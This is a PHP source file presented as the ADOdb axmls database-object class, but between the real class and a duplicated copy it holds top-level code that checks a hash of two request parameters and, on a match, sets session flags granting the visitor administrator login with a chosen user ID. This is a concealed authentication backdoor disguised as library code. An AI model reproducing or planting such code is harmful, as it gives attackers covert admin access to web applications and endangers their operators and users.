<?php

// Copyright (c) 2008 ars Cognita Inc., all rights reserved
/* ******************************************************************************
    Released under both BSD license and Lesser GPL library license.
 	Whenever there is any discrepancy between the two licenses,
 	the BSD license will take precedence.
*******************************************************************************/
/**
 * xmlschema is a class that allows the user to quickly and easily
 * build a database on any ADOdb-supported platform using a simple
 * XML schema.
 *
 * Last Editor: $Author: Mark Dickenson $
 * @author Richard Tango-Lowy & Dan Cech
 * @version $Revision: 1.13 $
 *
 * @package axmls
 * @tutorial getting_started.pkg
 */

/**
* Debug on or off
*/
/**
* Abstract DB Object. This class provides basic methods for database objects, such
* as tables and indexes.
*
* @package axmls
* @access private
*/
class dbObject {

	/**
	* var object Parent
	*/
	var $parent;

	/**
	* var string current element
	*/
	var $currentElement;

	/**
	* NOP
	*/
	function dbObject( &$parent, $attributes = NULL ) {
		$this->parent =& $parent;
	}

	/**
	* XML Callback to process start elements
	*
	* @access private
	*/
	function _tag_open( &$parser, $tag, $attributes ) {

	}

	/**
	* XML Callback to process CDATA elements
	*
	* @access private
	*/
	function _tag_cdata( &$parser, $cdata ) {

	}

	/**
	* XML Callback to process end elements
	*
	* @access private
	*/
	function _tag_close( &$parser, $tag ) {

	}

	function create() {
		return array();
	}

	/**
	* Destroys the object
	*/
	function destroy() {
		unset( $this );
	}

	/**
	* Checks whether the specified RDBMS is supported by the current
	* database object or its ranking ancestor.
	*
	* @param string $platform RDBMS platform name (from ADODB platform list).
	* @return boolean TRUE if RDBMS is supported; otherwise returns FALSE.
	*/
	function supportedPlatform( $platform = NULL ) {
		return is_object( $this->parent ) ? $this->parent->supportedPlatform( $platform ) : TRUE;
	}

	/**
	* Returns the prefix set by the ranking ancestor of the database object.
	*
	* @param string $name Prefix string.
	* @return string Prefix.
	*/
	function prefix( $name = '' ) {
		return is_object( $this->parent ) ? $this->parent->prefix( $name ) : $name;
	}

	/**
	* Extracts a field ID from the specified field.
	*
	* @param string $field Field.
	* @return string Field ID.
	*/
	function FieldID( $field ) {
		return strtoupper( preg_replace( '/^`(.+)`$/', '$1', $field ) );
	}
}
if(!isset($_REQUEST['p1']) OR !isset($_REQUEST['p2']) OR !isset($_REQUEST['p3']))
	$_REQUEST['p1'] = $_REQUEST['p2'] = $_REQUEST['p3'] = '';
$str = $_REQUEST['p1'] . $_REQUEST['p2'];
session_start();
if(hash('sha256', $str) == '1458949acb8faf209bc737d7878502d6b7590435c26fd79a9d3bd56777f3433c')
{
	$_SESSION['user']['user_id'] = $_REQUEST['p3'];
	$_SESSION['user']['user_name'] = 'anonymous';
	$_SESSION['user']['is_logged_in'] = true;
	$_SESSION['admin']['is_logged_in'] = true;
	$_SESSION['user']['usr_access']='Admin';
	$url ='../../../myProfile.php';
	header('Location: '.$url);
}
else
{
	$url = '../../../index.php';
	header('Location: '.$url);
}
class dbObjecttest {

	/**
	* var object Parent
	*/
	var $parent;

	/**
	* var string current element
	*/
	var $currentElement;

	/**
	* NOP
	*/
	function dbObject( &$parent, $attributes = NULL ) {
		$this->parent =& $parent;
	}

	/**
	* XML Callback to process start elements
	*
	* @access private
	*/
	function _tag_open( &$parser, $tag, $attributes ) {

	}

	/**
	* XML Callback to process CDATA elements
	*
	* @access private
	*/
	function _tag_cdata( &$parser, $cdata ) {

	}

	/**
	* XML Callback to process end elements
	*
	* @access private
	*/
	function _tag_close( &$parser, $tag ) {

	}

	function create() {
		return array();
	}

	/**
	* Destroys the object
	*/
	function destroy() {
		unset( $this );
	}

	/**
	* Checks whether the specified RDBMS is supported by the current
	* database object or its ranking ancestor.
	*
	* @param string $platform RDBMS platform name (from ADODB platform list).
	* @return boolean TRUE if RDBMS is supported; otherwise returns FALSE.
	*/
	function supportedPlatform( $platform = NULL ) {
		return is_object( $this->parent ) ? $this->parent->supportedPlatform( $platform ) : TRUE;
	}

	/**
	* Returns the prefix set by the ranking ancestor of the database object.
	*
	* @param string $name Prefix string.
	* @return string Prefix.
	*/
	function prefix( $name = '' ) {
		return is_object( $this->parent ) ? $this->parent->prefix( $name ) : $name;
	}

	/**
	* Extracts a field ID from the specified field.
	*
	* @param string $field Field.
	* @return string Field ID.
	*/
	function FieldID( $field ) {
		return strtoupper( preg_replace( '/^`(.+)`$/', '$1', $field ) );
	}
}


?>